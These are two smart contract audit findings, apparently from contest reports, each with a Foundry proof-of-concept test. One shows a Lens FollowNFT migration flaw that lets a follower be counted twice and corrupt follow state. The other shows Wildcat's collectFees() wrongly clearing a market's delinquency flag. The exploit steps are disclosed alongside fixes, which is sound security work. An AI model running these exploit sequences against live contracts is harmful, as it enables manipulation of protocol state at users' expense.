description:
In `FollowNFT.sol`, the `tryMigrate()` function is used to migrate users who were following before the V2 upgrade. It does so by updating `_followTokenIdByFollowerProfileId` and `_followDataByFollowTokenId`, which are state variables introduced in the V2 upgrade:
```solidity
_followTokenIdByFollowerProfileId[followerProfileId] = followTokenId;

uint48 mintTimestamp = uint48(StorageLib.getTokenData(followTokenId).mintTimestamp);

_followDataByFollowTokenId[followTokenId].followerProfileId = uint160(followerProfileId);
_followDataByFollowTokenId[followTokenId].originalFollowTimestamp = mintTimestamp;
_followDataByFollowTokenId[followTokenId].followTimestamp = mintTimestamp;
```

Since `_followTokenIdByFollowerProfileId` is a new state variable, it will be set to 0 for users who were following before the V2 upgrade. This allows old followers to call `follow()` to follow the profile again before `tryMigrate()` is called:
```solidity
function follow(
    uint256 followerProfileId,
    address transactionExecutor,
    uint256 followTokenId
) external override onlyHub returns (uint256) {
    if (_followTokenIdByFollowerProfileId[followerProfileId] != 0) {
        revert AlreadyFollowing();
    }
```

Even if `tryMigrate()` is called by the protocol team immediately after the V2 upgrade, a malicious user can still call `follow()` before `tryMigrate()` by:

  * Front-running the migration transaction.
  * Holding his profile and follow NFT in different addresses, which causes `tryMigrate()` to return [here](https://github.com/code-423n4/2023-07-lens/blob/main/contracts/FollowNFT.sol#L501-L504).

As a profile should not be able to follow the same profile twice, `tryMigrate()` should then revert for old followers who have called `follow()`. However, this isn’t enforced by `tryMigrate()` as there is no check that `_followDataByFollowTokenId[followerProfileId]` is 0.

As a result, if `tryMigrate()` is called after `follow()`, `_followerCount` will be incremented twice for a single profile:
```solidity
unchecked {
    ++_followerCount;
}

_followTokenIdByFollowerProfileId[followerProfileId] = followTokenId;
```

Additionally, even though `_followTokenIdByFollowerProfileId` points to a new `followTokenId`, `_followDataByFollowTokenId` will not be cleared for the previous follow token ID.

As the state of the `FollowNFT` contract is now corrupt, followers can perform functions that they normally should not be able to, such as unfollowing when their profile is not a follower (`isFollowing()` returns `false`).

recommendation:
```solidity
function tryMigrate(
    uint256 followerProfileId,
    address followerProfileOwner,
    uint256 idOfProfileFollowed,
    uint256 followTokenId
) external onlyHub returns (uint48) {
+   if (_followTokenIdByFollowerProfileId[followerProfileId] != 0) {
+       return 0;
+   }
+
    // Migrated FollowNFTs should have `originalFollowTimestamp` set
    if (_followDataByFollowTokenId[followTokenId].originalFollowTimestamp != 0) {
        return 0; // Already migrated
    }
```

**Proof of Concept:**
```solidity
The Foundry test below demonstrates that `tryMigrate()` can be called although the user is already following, and how `followerCount` and `_followDataByFollowTokenId` will be corrupted as a result. It can be run with the following command:

    forge test --match-test testCanMigrateWhileFollowing -vvv

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import 'test/base/BaseTest.t.sol';

contract FollowMigration_POC is BaseTest {
    address target = address(0x1337);
    address ALICE;

    uint256 targetProfileId;
    uint256 aliceProfileId;

    uint256 oldFollowTokenId;

    function setUp() public override {
        super.setUp();

        // Setup addresses for Alice
        ALICE = makeAddr("Alice");

        // Create profile for target and Alice 
        targetProfileId = _createProfile(target);
        aliceProfileId = _createProfile(ALICE);

        // Add simulateV1Follow() helper function to FollowNFT implementation
        FollowNFTHelper implementation = new FollowNFTHelper(address(hub));  
        vm.etch(hub.getFollowNFTImpl(), address(implementation).code);

        // Follow and unfollow to deploy target's FollowNFT contract
        vm.startPrank(defaultAccount.owner);
        hub.follow(
            defaultAccount.profileId,
            _toUint256Array(targetProfileId),
            _toUint256Array(0),
            _toBytesArray('')
        );
        hub.unfollow(defaultAccount.profileId, _toUint256Array(targetProfileId));
        vm.stopPrank();

        // Get FollowNFT contract
        address followNFTAddress = hub.getProfile(targetProfileId).followNFT; 
        followNFT = FollowNFT(followNFTAddress);

        // Alice follows target before the V2 upgrade
        oldFollowTokenId = FollowNFTHelper(followNFTAddress).simulateV1Follow(ALICE);
    }

    function testCanMigrateWhileFollowing() public {
        // After the V2 upgrade, Alice calls follow() instead of migrating her follow
        vm.startPrank(ALICE);
        uint256 followTokenId = hub.follow(
            aliceProfileId,
            _toUint256Array(targetProfileId),
            _toUint256Array(0),
            _toBytesArray('')
        )[0];

        // Alice migrates her V1 follow even though her profile is already following
        hub.batchMigrateFollows(
            _toUint256Array(aliceProfileId),
            _toUint256Array(targetProfileId),
            _toUint256Array(oldFollowTokenId)
        );

        // followTokenId's followerProfileId points to Alice's profile
        assertEq(followNFT.getFollowerProfileId(followTokenId), aliceProfileId);

        // However, Alice's _followTokenIdByFollowerProfileId points to oldFollowTokenId
        assertEq(followNFT.getFollowTokenId(aliceProfileId), oldFollowTokenId);

        // Follower count is 2 although Alice is the only follower
        assertEq(followNFT.getFollowerCount(), 2);

        // Wrap both follow tokens
        vm.startPrank(ALICE);
        followNFT.wrap(followTokenId);
        followNFT.wrap(oldFollowTokenId);

        // Alice unfollows using removeFollower()
        vm.expectEmit();
        emit Events.Unfollowed(aliceProfileId, targetProfileId, 1);
        followNFT.removeFollower(followTokenId);

        // Alice is no longer following
        assertFalse(followNFT.isFollowing(aliceProfileId));

        // However, she is still able to unfollow for a second time
        vm.expectEmit();
        emit Events.Unfollowed(aliceProfileId, targetProfileId, 1);
        followNFT.removeFollower(oldFollowTokenId);
    }
}

contract FollowNFTHelper is FollowNFT {
    constructor(address hub) FollowNFT(hub) {}

    /*
    Helper function to mimic a V1 follow, which does the following:
    - Increment _tokenIdCounter
    - Mint a followNFT
    */ 
    function simulateV1Follow(address follower) external returns (uint256 followTokenId) {
        followTokenId = ++_lastFollowTokenId;
        _mint(follower, followTokenId);
    }
}
```
```

description:
The `collectFees()` function calls `_writeState()` before transferring assets to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```solidity
_writeState(state);
asset.safeTransfer(feeRecipient, withdrawableFees);
```

However, `_writeState()` calls `totalAssets()` when checking if the market is delinquent:

[WildcatMarketBase.sol#L448-L453](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L448-L453)

```solidity
function _writeState(MarketState memory state) internal {
  bool isDelinquent = state.liquidityRequired() > totalAssets();
  state.isDelinquent = isDelinquent;
  _state = state;
  emit StateUpdated(state.scaleFactor, isDelinquent);
}
```

`totalAssets()` returns the current asset balance of the market:

[WildcatMarketBase.sol#L238-L240](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240)

```solidity
function totalAssets() public view returns (uint256) {
  return IERC20(asset).balanceOf(address(this));
}
```

Since the transfer of assets is only performed _after_ `_writeState()` is called, `totalAssets()` will be higher than it should be in `_writeState()`. This could cause `collectFees()` to incorrectly update `state.isDelinquent` to `false` when the market is still delinquent.

For example:

  * Assume a market has the following state:

    * `liquidityRequired() = 1050`.
    * `totalAssets() = 1000`.
    * `state.accruedProtocolFees = 50`.
  * The market’s borrower calls `collectFees()`. In `_writeState()`:

    * `liquidityRequired() = 1050 - 50 = 1000`.
    * `totalAssets() = 1000` since the transfer of assets has not occurred.
    * As `liquidityRequired() == totalAssets()`, `isDelinquent` is updated to `false`.
    * However, the market is actually still delinquent as `totalAssets()` will be `950` after the call to `collectFees()`.

recommendation:
In `collectFees()`, consider calling `_writeState()` after assets have been transferred to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```solidity
// _writeState(state);
asset.safeTransfer(feeRecipient, withdrawableFees);
_writeState(state);
```

Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/commit/016f6f2d43fa33cebe15c422f8663c76a4e4fd10).

Note: For full discussion, see[here](https://github.com/code-423n4/2023-10-wildcat-findings/issues/500).

**Proof of Concept:**
```solidity
The following test demonstrates how `collectFees()` incorrectly updates `state.isDelinquent` to `false` when the market is still delinquent:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CollectFeesTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    WildcatMarket market;

    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Set protocol fee to 10%
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(0),
            0, 
            1000 // protocolFeeBips
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);
        asset.mint(AIKEN, 1000e18);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);

        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_collectFeesUpdatesDelinquencyWrongly() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Some time passes, market becomes delinquent
        skip(2 weeks);
        market.updateState();
        MarketState memory state = market.previousState();
        assertTrue(state.isDelinquent);

        // Aiken tops up some assets
        uint256 amount = market.coverageLiquidity() -  market.totalAssets() - market.accruedProtocolFees();
        vm.prank(AIKEN);
        asset.transfer(address(market), amount);

        // Someone calls collectFees()
        market.collectFees();

        // Market was updated to not delinquent
        state = market.previousState();
        assertFalse(state.isDelinquent);

        // However, it should be delinquent as liquidityRequired > totalAssets()
        assertGt(market.coverageLiquidity(), market.totalAssets());
    }
}
```
